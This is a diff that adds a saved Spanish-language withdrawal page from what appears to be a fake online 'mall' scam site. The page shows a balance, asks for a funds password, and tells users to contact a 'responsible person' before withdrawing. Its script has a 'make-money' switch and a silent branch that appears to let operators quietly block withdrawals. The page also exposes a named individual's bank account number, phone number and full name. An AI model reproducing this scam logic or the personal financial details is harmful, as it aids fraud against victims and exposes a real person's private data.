@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<!-- saved from url=(0044)https://coppel180.com/index/my/withdraw.html -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="format-detection" content="telephone=no,email=no">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
+<link type="text/css" rel="stylesheet" href="./Withdraw Craiglist Mall_files/commin.css">
+<title>Presentación</title>
+<style>
+
+
+	.card{
+		display:none;
+	}
+	.layui-layer-btn0, .layui-layer-btn1 {
+		font-size: 16px;
+	}
+	.layui-layer-btn {
+		padding-bottom: 0 !important;
+		text-align: center !important;
+		height: 50px;
+		overflow: hidden;
+	}
+</style><link id="layuicss-laydate" rel="stylesheet" href="./Withdraw Craiglist Mall_files/laydate.css" media="all"><link id="layuicss-layer" rel="stylesheet" href="./Withdraw Craiglist Mall_files/layer.css" media="all"><link id="layuicss-skincodecss" rel="stylesheet" href="./Withdraw Craiglist Mall_files/code.css" media="all"></head>
+
+
+
+<body>
+<div class="Recharge">
+	<div class="discount-nav">
+		<div class="discount-left" onclick="history.go(-1);">
+			<img src="./Withdraw Craiglist Mall_files/back.jpg">
+		</div>
+		<div class="discount-title">Presentación</div>
+	</div>
+	<div class="withdrawContainer">
+		<div class="balance">
+			<div class="balance-card">
+				
+				
+							<div class="current-balance">Balance</div>
+				
+				 <div class="money">Mex$34,153.59</div>
+				<div class="withDrawMoney"></div>
+						
+
+				<div class="rate">Cargo por servicios prestados：0Mex$</div>
+				<div class="rate Single">Presentación mínima：0Mex$</div>
+						
+				</div>
+			</div>
+		</div>
+		<div class="balance-main">
+			<div class="title">Introduzca el importe de la retirada</div>
+			<div class="input">
+				<div class="amountInput">
+					<span class="symbol">Mex$</span>
+					<input name="num" id="num" type="text" placeholder="Introduzca la cantidad">
+				</div>
+			</div>
+			<div class="money-tip">
+				<div> </div>
+				<div class="yellow" onclick="balance(&#39;34153.59&#39;)">Todos los saldos</div>
+			</div>
+		</div>
+		
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+		
+		
+		<div class="balance-main">
+			<div class="title">Por favor, ingresa la contraseña de fondos</div>
+			<div class="input">
+				<div class="amountInput">
+					<input type="password" id="password" name="password" style="padding-left:0px;" placeholder="Por favor, ingresa la contraseña de fondos">
+				</div>
+			</div>
+		</div>
+		<div class="balance-info" style="display:none;">
+			<div class="van-cell">
+				<div class="van-cell__title">
+					<span>Método de retirada</span>
+				</div>
+				
+				
+				
+				<select class="van-cell__value txt-tori" style="border:0px;background-color:#fff;" onchange="withdraw(this)">
+				        				        <option value="0"></option>
+    				    				    				</select>
+				
+				
+				
+			</div>
+		</div>
+		            		<div class="balance-info cards" data-bankinfo="0" style="display:none">
+            		                			<div class="van-cell">
+            				<div class="van-cell__title">
+            					<span>número de tarjeta</span>
+            				</div>
+            				<div class="van-cell__value txt-tori">
+            					<span>646069206818455169</span>
+            				</div>
+            			</div>
+            			            			<div class="van-cell">
+            				<div class="van-cell__title">
+            					<span>Número de teléfono</span>
+            				</div>
+            				<div class="van-cell__value txt-tori">
+            					<span>8112500997</span>
+            				</div>
+            			</div>
+            			            			<div class="van-cell">
+            				<div class="van-cell__title">
+            					<span>Nombre</span>
+            				</div>
+            				<div class="van-cell__value txt-tori">
+            					<span>Jorge Rodríguez </span>
+            				</div>
+            			</div>
+            			            			<div class="van-cell">
+            				<div class="van-cell__title">
+            					<span>tipo de banco</span>
+            				</div>
+            				<div class="van-cell__value txt-tori">
+            					<span>STP</span>
+            				</div>
+            			</div>
+            			            		</div>
+        		    				<div class="grab-card isBack">
+			<div class="grab-card-title">
+				<p>Prompt</p>
+			</div>
+			
+			
+			
+			
+						<div class="grab-card-box">
+				
+				
+				<p>1.Por favor, contacta al responsable para informar sobre el monto del retiro。</p>
+				<p>2.El tiempo de retiro puede retrasarse hasta 24 horas, el tiempo específico de llegada se basa en el banco。</p>
+				
+				
+			</div>
+
+		</div>
+		<div class="balance-btn">
+			<div class="buttonM">
+				<span>Confirmación de la presentación</span>
+			</div>
+		</div>
+	</div>
+	
+
+
+
+<script src="./Withdraw Craiglist Mall_files/jquery.js.descarga"></script>
+<script src="./Withdraw Craiglist Mall_files/layui.js.descarga"></script>
+
+<style>
+  
+  
+  .layui-layer-btn {
+    text-align: right !important;
+  }
+</style>
+<script>
+bank = "[{&quot;pix_account&quot;:&quot;646069206818455169&quot;,&quot;tel&quot;:&quot;8112500997&quot;,&quot;username&quot;:&quot;Jorge Rodr\u00edguez &quot;,&quot;bank_name&quot;:&quot;STP&quot;}]";
+if (!bank) {
+    layer.msg("No tiene tarjeta bancaria disponible,Añadir primero", function() {
+        window.location.href = "/index/my/bankinfo.html";
+    });
+}
+bankinfo = $(".balance-info.cards").data("bankinfo");
+
+function withdraw(a) {
+    $("div[data-bankinfo='" + bankinfo + "']").hide();
+    $("div[data-bankinfo='" + a.value + "']").show();
+    bankinfo = a.value;
+}
+
+function balance(num) {
+    $("#num").val(num);
+}
+
+$(".balance-btn").click(function() {
+    var password = $("#password").val();
+    var num = $("#num").val();
+
+      if(!num){
+                layer.msg("Introduzca el importe de la retirada");
+                return;
+            }
+            if(!password){
+                layer.msg("Introduzca la contraseña de la transacción");
+                return;
+            }
+
+
+
+    var gqStatus = "2";
+    if (gqStatus === "1") {
+        // 搞钱开关已开启的逻辑
+        continueWithdraw(password, num, bankinfo);
+        console.log("error");
+
+    } else {
+        var gqDwellSeconds = "1";
+        console.log(gqDwellSeconds);
+        var loadIndex = layer.msg("Por favor, espere, se está procesando el retiro...", {
+            icon: 16,
+            shade: 0.6, // 设置遮罩层透明度为 0.6
+            time: gqDwellSeconds * 1000, // 将秒数转换为毫秒
+            success: function(layero, index) {
+                setTimeout(function() {
+                    // 完成等待时间后执行下一步操作
+                    continueWithdraw(password, num, bankinfo);
+                }, gqDwellSeconds * 1000);
+            }
+        });
+    }
+});
+function continueWithdraw(password, num, bankinfo) {
+    // 执行下一步操作的代码
+    $.post("/index/my/withdraw.html", { password: password, num: num, bankinfo: bankinfo }, function(res) {
+        if (res.code == 0) { //成功
+            layer.msg(res.msg, function() {
+                window.location.href = res.data;
+            });
+        } else if (res.code == 404) { //搞qian
+        
+        
+           
+        } else {
+            layer.msg(res.msg);
+        }
+    });
+}
+
+
+</script>
+</body></html>
